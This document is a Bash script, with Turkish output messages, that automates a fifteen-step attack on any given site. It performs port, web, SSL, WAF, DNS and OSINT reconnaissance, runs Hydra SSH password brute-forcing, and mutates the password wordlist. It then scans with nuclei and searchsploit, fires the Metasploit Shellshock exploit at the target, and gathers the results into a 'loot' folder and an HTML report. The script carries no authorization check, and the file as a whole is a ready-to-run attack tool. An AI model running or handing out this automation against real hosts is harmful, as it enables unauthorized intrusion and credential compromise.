#!/bin/bash

target=$1
if [ -z "$target" ]; then
    echo "Kullanım: $0 hedefsite.com"
    exit 1
fi

echo "[*] Hedef: $target"
loot_dir="loot/$target"
mkdir -p "$loot_dir"

echo "[1/15] Nmap port taraması başlatılıyor..."
nmap -sV -sC -T4 -Pn $target -oN "$loot_dir/nmap.txt"

echo "[2/15] Web teknolojisi tanımlanıyor (WhatWeb)..."
whatweb $target > "$loot_dir/whatweb.txt"

echo "[3/15] SSL taraması yapılıyor..."
sslscan $target > "$loot_dir/sslscan.txt"

echo "[4/15] WAF kontrolü (wafw00f)..."
wafw00f $target > "$loot_dir/waf.txt"

echo "[5/15] WHOIS bilgisi çekiliyor..."
whois $target > "$loot_dir/whois.txt"

echo "[6/15] DNS bilgisi çekiliyor..."
dig $target any +noall +answer > "$loot_dir/dns.txt"

echo "[7/15] OSINT: theHarvester ile bilgi toplama..."
theHarvester -d $target -b all > "$loot_dir/theHarvester.txt"

echo "[8/15] Websitenin ekran görüntüsü alınıyor..."
webscreenshot -i $target -o "$loot_dir/screenshots" > /dev/null

echo "[9/15] Hydra ile SSH brute-force deneniyor..."
hydra -L wordlists/usernames.txt -P wordlists/passwords.txt ssh://$target -o "$loot_dir/hydra_ssh.txt"

echo "[10/15] Nuclei ile zafiyet taraması yapılıyor..."
nuclei -u $target -o "$loot_dir/nuclei.txt"

echo "[11/15] searchsploit ile otomatik exploit aranıyor..."
searchsploit --nmap "$loot_dir/nmap.txt" > "$loot_dir/exploits.txt"

echo "[12/15] Password Mutation Engine çalışıyor..."
python3 scripts/generate_passwords.py "$target" >> wordlists/passwords.txt

echo "[13/15] Metasploit ile otomatize exploit deneniyor..."
msfconsole -q -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS $target; run; exit" > "$loot_dir/metasploit.txt"

echo "[14/15] AI destekli öneriler oluşturuluyor..."
python3 scripts/ai_analysis.py "$loot_dir" > "$loot_dir/ai_suggestions.txt"

echo "[15/15] HTML raporu oluşturuluyor..."
echo "<html><head><title>Pentest Raporu</title></head><body><h1>Rapor: $target</h1><pre>" > "$loot_dir/report.html"
cat "$loot_dir"/*.txt >> "$loot_dir/report.html"
echo "</pre></body></html>" >> "$loot_dir/report.html"

echo "[✔] TAMAM! Tüm çıktılar: loot/$target"
